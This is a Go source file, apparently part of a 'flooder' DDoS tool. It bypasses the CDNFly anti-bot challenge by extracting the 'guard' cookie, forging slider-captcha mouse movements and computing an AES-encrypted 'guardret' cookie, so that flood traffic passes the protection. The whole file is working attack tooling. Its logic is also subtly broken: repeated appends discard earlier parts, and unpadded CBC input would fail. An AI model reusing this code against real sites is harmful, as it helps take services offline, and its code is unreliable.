package Bypass

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"flooder/Utils"
	"fmt"
	"net"
	"time"
)

func genGuardret(data []byte, cookie []byte) (string) {

	if(len(cookie) > 8){
		cookie = cookie[:8]
	}

	hash := md5.Sum(cookie)
	key := hash[:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	padder := cipher.NewCBCEncrypter(block, key)
	padded := make([]byte, len(data))
	padder.CryptBlocks(padded, data)

	return base64.StdEncoding.EncodeToString(padded)
}

func CdnFlyHandleConn(conn net.Conn, payload []byte) []byte {
	timestamp := int(time.Now().UnixNano() / int64(time.Millisecond))
	json := "{\"move\":[{\"timestamp\":"+fmt.Sprint(timestamp)+",\"x\":357,\"y\":390},{\"timestamp\":"+fmt.Sprint(timestamp)+",\"x\":358,\"y\":390},{\"timestamp\":"+fmt.Sprint(timestamp+16)+",\"x\":360,\"y\":390},{\"timestamp\":"+fmt.Sprint(timestamp+33)+",\"x\":373,\"y\":387},{\"timestamp\":"+fmt.Sprint(timestamp+50)+",\"x\":411,\"y\":380},{\"timestamp\":"+fmt.Sprint(timestamp+83)+",\"x\":480,\"y\":372},{\"timestamp\":"+fmt.Sprint(timestamp+100)+",\"x\":565,\"y\":369},{\"timestamp\":"+fmt.Sprint(timestamp+116)+",\"x\":667,\"y\":369}],\"btn\":40,\"slider\":340,\"page_width\":1000,\"page_height\":800}"

	prefix := []byte{
		// Offset 0x00000000 to 0x00000011
		0x73, 0x65, 0x74, 0x2D, 0x63, 0x6F, 0x6F, 0x6B, 0x69, 0x65, 0x3A, 0x20,
		0x67, 0x75, 0x61, 0x72, 0x64, 0x3D}

	suffix := []byte{
		// Offset 0x000000C0 to 0x000000D0
		0x3B, 0x20, 0x70, 0x61, 0x74, 0x68, 0x3D, 0x2F, 0x3B, 0x45, 0x78, 0x70,
		0x69, 0x72, 0x65, 0x73, 0x3D}
	_, _ = conn.Write(payload)
	resp, _ := Utils.ReadConn(conn)
	cookie := Utils.FindSubBytes(resp, prefix, suffix)
	guardret := genGuardret([]byte(json),cookie)
	retPayload := append(payload, []byte("Cookie: guard=")...)
	retPayload = append(payload, cookie...)
	retPayload = append(payload, []byte("; guardret=")...)
	retPayload = append(payload, guardret...)
	return retPayload
}

func CdnFlyHandleConnTLS(conn *tls.Conn, payload []byte) []byte {
	timestamp := int(time.Now().UnixNano() / int64(time.Millisecond))
	json := "{\"move\":[{\"timestamp\":"+fmt.Sprint(timestamp)+",\"x\":357,\"y\":390},{\"timestamp\":"+fmt.Sprint(timestamp)+",\"x\":358,\"y\":390},{\"timestamp\":"+fmt.Sprint(timestamp+16)+",\"x\":360,\"y\":390},{\"timestamp\":"+fmt.Sprint(timestamp+33)+",\"x\":373,\"y\":387},{\"timestamp\":"+fmt.Sprint(timestamp+50)+",\"x\":411,\"y\":380},{\"timestamp\":"+fmt.Sprint(timestamp+83)+",\"x\":480,\"y\":372},{\"timestamp\":"+fmt.Sprint(timestamp+100)+",\"x\":565,\"y\":369},{\"timestamp\":"+fmt.Sprint(timestamp+116)+",\"x\":667,\"y\":369}],\"btn\":40,\"slider\":340,\"page_width\":1000,\"page_height\":800}"

	prefix := []byte{
		// Offset 0x00000000 to 0x00000011
		0x73, 0x65, 0x74, 0x2D, 0x63, 0x6F, 0x6F, 0x6B, 0x69, 0x65, 0x3A, 0x20,
		0x67, 0x75, 0x61, 0x72, 0x64, 0x3D}

	suffix := []byte{
		// Offset 0x000000C0 to 0x000000D0
		0x3B, 0x20, 0x70, 0x61, 0x74, 0x68, 0x3D, 0x2F, 0x3B, 0x45, 0x78, 0x70,
		0x69, 0x72, 0x65, 0x73, 0x3D}
	fmt.Println(string(append(payload, []byte("\r\n")...)))
	_, _ = conn.Write(append(payload, []byte("\r\n")...))
	resp, _ := Utils.ReadTLSConn(conn)
	fmt.Println(resp)
	cookie := Utils.FindSubBytes(resp, prefix, suffix)
	guardret := genGuardret([]byte(json),cookie)
	retPayload := append(payload, []byte("Cookie: guard=")...)
	retPayload = append(payload, cookie...)
	retPayload = append(payload, []byte("; guardret=")...)
	retPayload = append(payload, guardret...)
	return retPayload
}
